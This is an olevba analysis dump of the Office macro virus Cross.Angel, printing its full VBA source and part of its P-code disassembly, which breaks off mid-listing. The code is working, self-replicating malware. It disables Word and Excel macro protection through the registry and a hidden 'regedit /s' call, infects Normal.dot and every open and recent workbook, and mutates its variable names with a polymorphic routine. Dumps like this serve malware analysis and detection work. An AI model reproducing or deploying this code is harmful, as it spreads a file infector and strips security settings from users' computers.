olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const ˆ»¾™Š = "' Cross.Angel", •Ç¤ Ÿ = 132, µÈÇŠ¿ = "9.0", À©¸Ë¬ = "Macro", Ë¶ž½œ = "Tools", ¯¹­®§ = &H1, ¯¹­®§_ = &H0, ¯¶˜™² = 0, ¢Â¶¥• = 1, »…¨�Ž = 12, µ—Ê·¦ = "excel.application", ¼Æ±¬• = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * ¯¶˜™²)
If Application.Version = µÈÇŠ¿ Then
    Application.CommandBars(À©¸Ë¬).Controls((¢Â¶¥• + ¢Â¶¥• + ¢Â¶¥•)).Enabled = (Rnd * ¯¶˜™²)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = ¯¹­®§
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ¯¹­®§_
    Application.CommandBars(Ë¶ž½œ).Controls(»…¨�Ž).Enabled = (Rnd * ¯¶˜™²)
    Options.VirusProtection = (Rnd * ¯¶˜™²)
End If
Options.SaveNormalPrompt = (Rnd * ¯¶˜™²)
’¸„„„ = ‚–˜¤�(ThisDocument.VBProject.VBComponents(¢Â¶¥•).CodeModule.Lines(¢Â¶¥•, •Ç¤ Ÿ))
If MacroContainer = ActiveDocument Then Set µˆ˜ˆŸ = NormalTemplate Else Set µˆ˜ˆŸ = ActiveDocument
With µˆ˜ˆŸ.VBProject.VBComponents(¢Â¶¥•).CodeModule
    If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
        .DeleteLines ¢Â¶¥•, .CountOfLines
        .InsertLines ¢Â¶¥•, ’¸„„„
        If µˆ˜ˆŸ = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ¢Â¶¥• Then
Set ´°ƒˆ� = GetObject(, µ—Ê·¦)
If ´°ƒˆ� = "" Then Set ´°ƒˆ� = CreateObject(µ—Ê·¦): ª±›¤Ã = ¢Â¶¥•
If ª±›¤Ã <> ¢Â¶¥• Then
    For Each †�„–À In ´°ƒˆ�.Workbooks
       With †�„–À.VBProject.VBComponents(¼Æ±¬•).CodeModule
            If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
                .DeleteLines ¢Â¶¥•, .CountOfLines
                .InsertLines ¢Â¶¥•, ’¸„„„
                If †�„–À.Path <> "" Then †�„–À.Save Else †�„–À.SaveAs †�„–À.FullName
            End If
        End With
    Next
Else
    For †�„–À = ¢Â¶¥• To ´°ƒˆ�.Application.RecentFiles.Maximum
        ´°ƒˆ�.Application.RecentFiles(†�„–À).Open
            With ´°ƒˆ�.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(¼Æ±¬•).CodeModule
                If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
                    .DeleteLines ¢Â¶¥•, .CountOfLines
                    .InsertLines ¢Â¶¥•, ’¸„„„
                End If
            End With
        ´°ƒˆ�.Application.Workbooks(Application.RecentFiles(1).Name).Close ¢Â¶¥•
    Next
    ´°ƒˆ�.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ¢Â¶¥•
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ¢Â¶¥• Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ¢Â¶¥•
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const ˆ»¾™Š = "' Cross.Angel", •Ç¤ Ÿ = 132, µÈÇŠ¿ = "9.0", À©¸Ë¬ = "Macro", Ë¶ž½œ = "Tools", ¯¶˜™² = 0, ¢Â¶¥• = 1, »…¨�Ž = 10, µ—Ê·¦ = "word.application", ¼Æ±¬• = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * ¯¶˜™²)
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = µÈÇŠ¿ Then
    Application.CommandBars(À©¸Ë¬).Controls((¢Â¶¥• + ¢Â¶¥• + ¢Â¶¥•)).Enabled = (Rnd * ¯¶˜™²)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(Ë¶ž½œ).Controls(»…¨�Ž).Enabled = (Rnd * ¯¶˜™²)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
’¸„„„ = ‚–˜¤�(ThisWorkbook.VBProject.VBComponents(¼Æ±¬•).CodeModule.Lines(¢Â¶¥•, •Ç¤ Ÿ))
For Each †�„–À In Application.Workbooks
    With †�„–À.VBProject.VBComponents(¼Æ±¬•).CodeModule
        If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
            .DeleteLines ¢Â¶¥•, .CountOfLines
            .InsertLines ¢Â¶¥•, ’¸„„„
            If †�„–À.Path <> "" Then †�„–À.Save Else †�„–À.SaveAs †�„–À.FullName
        End If
    End With
Next
If Application.Workbooks.Count = ¢Â¶¥• Then
    Application.WindowState = xlMinimized
    For †�„–À = ¢Â¶¥• To Application.RecentFiles.Maximum
        Application.RecentFiles(†�„–À).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(¼Æ±¬•).CodeModule
                If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
                    .DeleteLines ¢Â¶¥•, .CountOfLines
                    .InsertLines ¢Â¶¥•, ’¸„„„
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close ¢Â¶¥•
    Next
End If
Set ´°ƒˆ� = GetObject(, µ—Ê·¦)
If ´°ƒˆ� = "" Then Set ´°ƒˆ� = CreateObject(µ—Ê·¦): ª±›¤Ã = ¢Â¶¥•
If ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ¢Â¶¥• Then ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ¢Â¶¥•
If ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ¢Â¶¥• Then
With ´°ƒˆ�.NormalTemplate.VBProject.VBComponents(¢Â¶¥•).CodeModule
    If .Lines(¢Â¶¥•, ¢Â¶¥•) <> ˆ»¾™Š Then
        .DeleteLines ¢Â¶¥•, .CountOfLines
        .InsertLines ¢Â¶¥•, ’¸„„„
        ´°ƒˆ�.NormalTemplate.Save
        ´°ƒˆ�.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ¢Â¶¥•
    End If
End With
End If
If ª±›¤Ã = ¢Â¶¥• Then ´°ƒˆ�.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function ‚–˜¤�(’¸„„„) 'JSMP v1.2
Dim ª•¦°Â(0 To 20): Randomize
Â¡ÁƒŒ = 1: ª•¦°Â(0) = "’¸„„„": ª•¦°Â(1) = "‚–˜¤�": ª•¦°Â(2) = "ª•¦°Â": ª•¦°Â(3) = "³žÃ­˜": ª•¦°Â(4) = "š²µ‚¤": ª•¦°Â(5) = "Â¡ÁƒŒ": ª•¦°Â(6) = "ˆ»¾™Š": ª•¦°Â(7) = "•Ç¤ Ÿ": ª•¦°Â(8) = "µÈÇŠ¿": ª•¦°Â(9) = "À©¸Ë¬": ª•¦°Â(10) = "Ë¶ž½œ": ª•¦°Â(11) = "¯¹­®§": ª•¦°Â(12) = "¯¶˜™²": ª•¦°Â(13) = "¢Â¶¥•": ª•¦°Â(14) = "»…¨�Ž": ª•¦°Â(15) = "µ—Ê·¦": ª•¦°Â(16) = "¼Æ±¬•": ª•¦°Â(17) = "µˆ˜ˆŸ": ª•¦°Â(18) = "´°ƒˆ�": ª•¦°Â(19) = "ª±›¤Ã": ª•¦°Â(20) = "†�„–À"
For ³žÃ­˜ = 0 To 20
š²µ‚¤ = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
Â¡ÁƒŒ = InStr(Â¡ÁƒŒ + 1, ’¸„„„, ª•¦°Â(³žÃ­˜))
If Â¡ÁƒŒ Then ’¸„„„ = Mid(’¸„„„, 1, (Â¡ÁƒŒ - 1)) & š²µ‚¤ & Mid(’¸„„„, (Â¡ÁƒŒ + Len(ª•¦°Â(³žÃ­˜))), Len(’¸„„„))
Loop While Â¡ÁƒŒ
Next
‚–˜¤� = ’¸„„„
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Across
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11749 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000C " Cross.Angel"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x000D "' Cross.Angel"
' 	VarDefn ˆ»¾™Š
' 	LitDI2 0x0084 
' 	VarDefn •Ç¤ Ÿ
' 	LitStr 0x0003 "9.0"
' 	VarDefn µÈÇŠ¿
' 	LitStr 0x0005 "Macro"
' 	VarDefn À©¸Ë¬
' 	LitStr 0x0005 "Tools"
' 	VarDefn Ë¶ž½œ
' 	LitHI2 0x0001 
' 	VarDefn ¯¹­®§
' 	LitHI2 0x0000 
' 	VarDefn ¯¹­®§_
' 	LitDI2 0x0000 
' 	VarDefn ¯¶˜™²
' 	LitDI2 0x0001 
' 	VarDefn ¢Â¶¥•
' 	LitDI2 0x000C 
' 	VarDefn »…¨�Ž
' 	LitStr 0x0011 "excel.application"
' 	VarDefn µ—Ê·¦
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn ¼Æ±¬•
' Line #4:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	Ld Application 
' 	MemLd Version 
' 	Ld µÈÇŠ¿ 
' 	Eq 
' 	IfBlock 
' Line #6:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	Add 
' 	Ld ¢Â¶¥• 
' 	Add 
' 	Paren 
' 	Ld À©¸Ë¬ 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	Ld ¯¹­®§ 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	Ld ¯¹­®§_ 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #10:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld »…¨�Ž 
' 	Ld Ë¶ž½œ 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	Ld ¢Â¶¥• 
' 	Ld •Ç¤ Ÿ 
' 	Ld ¢Â¶¥• 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd ‚–˜¤� 0x0001 
' 	St ’¸„„„ 
' Line #15:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set µˆ˜ˆŸ 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set µˆ˜ˆŸ 
' 	EndIf 
' Line #16:
' 	StartWithExpr 
' 	Ld ¢Â¶¥• 
' 	Ld µˆ˜ˆŸ 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #17:
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ˆ»¾™Š 
' 	Ne 
' 	IfBlock 
' Line #18:
' 	Ld ¢Â¶¥• 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #19:
' 	Ld ¢Â¶¥• 
' 	Ld ’¸„„„ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #20:
' 	Ld µˆ˜ˆŸ 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndWith 
' Line #23:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ¢Â¶¥• 
' 	Ne 
' 	IfBlock 
' Line #24:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld µ—Ê·¦ 
' 	ArgsLd GetObject 0x0002 
' 	Set ´°ƒˆ� 
' Line #25:
' 	Ld ´°ƒˆ� 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld µ—Ê·¦ 
' 	ArgsLd CreateObject 0x0001 
' 	Set ´°ƒˆ� 
' 	BoS 0x0000 
' 	Ld ¢Â¶¥• 
' 	St ª±›¤Ã 
' 	EndIf 
' Line #26:
' 	Ld ª±›¤Ã 
' 	Ld ¢Â¶¥• 
' 	Ne 
' 	IfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld †�„–À 
' 	EndForVariable 
' 	Ld ´°ƒˆ� 
' 	MemLd Workbooks 
' 	ForEach 
' Line #28:
' 	StartWithExpr 
' 	Ld ¼Æ±¬• 
' 	Ld †�„–À 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #29:
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ˆ»¾™Š 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld ¢Â¶¥• 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #31:
' 	Ld ¢Â¶¥• 
' 	Ld ’¸„„„ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #32:
' 	Ld †�„–À 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld †�„–À 
' 	ArgsMemCall Save 0x0000 
' 	Else 
' 	BoSImplicit 
' 	Ld †�„–À 
' 	MemLd FullName 
' 	Ld †�„–À 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndWith 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	StartForVariable 
' 	Ld †�„–À 
' 	EndForVariable 
' 	Ld ¢Â¶¥• 
' 	Ld ´°ƒˆ� 
' 	MemLd Application 
' 	MemLd RecentFiles 
' 	MemLd Maximum 
' 	For 
' Line #38:
' 	Ld †�„–À 
' 	Ld ´°ƒˆ� 
' 	MemLd Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	ArgsMemCall Option 0x0000 
' Line #39:
' 	StartWithExpr 
' 	Ld ¼Æ±¬• 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld ´°ƒˆ� 
' 	MemLd Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #40:
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ˆ»¾™Š 
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld ¢Â¶¥• 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #42:
' 	Ld ¢Â¶¥• 
' 	Ld ’¸„„„ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndWith 
' Line #45:
' 	Ld ¢Â¶¥• 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld ´°ƒˆ� 
' 	MemLd Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #46:
' 	StartForVariable 
' 	Next 
' Line #47:
' 	Ld ´°ƒˆ� 
' 	ArgsMemCall Quit 0x0000 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld ¢Â¶¥• 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x003C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Why I lost my angel? Can't live without you!"
' 	Ld vbQuestion 
' 	LitStr 0x0020 "Cross.Angel by jackie-/Lz0NT/MVT"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #52:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ¢Â¶¥• 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ¢Â¶¥• 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	Dim (Const) 
' 	LitStr 0x000D "' Cross.Angel"
' 	VarDefn ˆ»¾™Š
' 	LitDI2 0x0084 
' 	VarDefn •Ç¤ Ÿ
' 	LitStr 0x0003 "9.0"
' 	VarDefn µÈÇŠ¿
' 	LitStr 0x0005 "Macro"
' 	VarDefn À©¸Ë¬
' 	LitStr 0x0005 "Tools"
' 	VarDefn Ë¶ž½œ
' 	LitDI2 0x0000 
' 	VarDefn ¯¶˜™²
' 	LitDI2 0x0001 
' 	VarDefn ¢Â¶¥•
' 	LitDI2 0x000A 
' 	VarDefn »…¨�Ž
' 	LitStr 0x0010 "word.application"
' 	VarDefn µ—Ê·¦
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn ¼Æ±¬•
' Line #57:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #58:
' 	LitStr 0x0007 "c:\.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 ".REG"
' 	Ne 
' 	IfBlock 
' Line #59:
' 	LitStr 0x0007 "c:\.reg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #61:
' 	Ld Application 
' 	MemLd Version 
' 	Ld µÈÇŠ¿ 
' 	Eq 
' 	IfBlock 
' Line #62:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	Add 
' 	Ld ¢Â¶¥• 
' 	Add 
' 	Paren 
' 	Ld À©¸Ë¬ 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #67:
' 	ElseBlock 
' Line #68:
' 	Ld Rnd 
' 	Ld ¯¶˜™² 
' 	Mul 
' 	Paren 
' 	Ld »…¨�Ž 
' 	Ld Ë¶ž½œ 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 ""EnableMacroVirusProtection"="0""
' 	PrintItemNL 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	LitStr 0x0012 "regedit /s c:\.reg"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #77:
' 	Ld ¢Â¶¥• 
' 	Ld •Ç¤ Ÿ 
' 	Ld ¼Æ±¬• 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd ‚–˜¤� 0x0001 
' 	St ’¸„„„ 
' Line #78:
' 	StartForVariable 
' 	Ld †�„–À 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ForEach 
' Line #79:
' 	StartWithExpr 
' 	Ld ¼Æ±¬• 
' 	Ld †�„–À 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #80:
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ˆ»¾™Š 
' 	Ne 
' 	IfBlock 
' Line #81:
' 	Ld ¢Â¶¥• 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #82:
' 	Ld ¢Â¶¥• 
' 	Ld ’¸„„„ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #83:
' 	Ld †�„–À 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld †�„–À 
' 	ArgsMemCall Save 0x0000 
' 	Else 
' 	BoSImplicit 
' 	Ld †�„–À 
' 	MemLd FullName 
' 	Ld †�„–À 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndWith 
' Line #86:
' 	StartForVariable 
' 	Next 
' Line #87:
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	Ld ¢Â¶¥• 
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld xlMinimized 
' 	Ld Application 
' 	MemSt WindowState 
' Line #89:
' 	StartForVariable 
' 	Ld †�„–À 
' 	EndForVariable 
' 	Ld ¢Â¶¥• 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemLd Maximum 
' 	For 
' Line #90:
' 	Ld †�„–À 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	ArgsMemCall Option 0x0000 
' Line #91:
' 	StartWithExpr 
' 	Ld ¼Æ±¬• 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #92:
' 	Ld ¢Â¶¥• 
' 	Ld ¢Â¶¥• 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld ˆ»¾™Š 
' 	Ne 
' 	IfBlock 
' Line #93:
' 	Ld ¢Â¶¥• 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #94:
' 	Ld ¢Â¶¥• 
' 	Ld ’¸„„„ 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndWith 
' Line #97:
' 	Ld ¢Â¶¥• 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #98:
' 	StartForVariable 
' 	Next 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld µ—Ê·¦ 
' 	ArgsLd GetObject 0x0002 
' 	Set ´°ƒˆ� 
' Line #101:
' 	Ld ´°ƒˆ� 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld µ—Ê·¦ 
' 	ArgsLd CreateObject 0x0001 
' 	Set ´°ƒˆ� 
' 	BoS 0x0000 
' 	Ld ¢Â¶¥• 
' 	St ª±›¤Ã 
' 	EndIf 
' Line #102:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld ´°ƒˆ� 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ¢Â¶¥• 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ¢Â¶¥• 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld ´°ƒˆ� 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #103:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
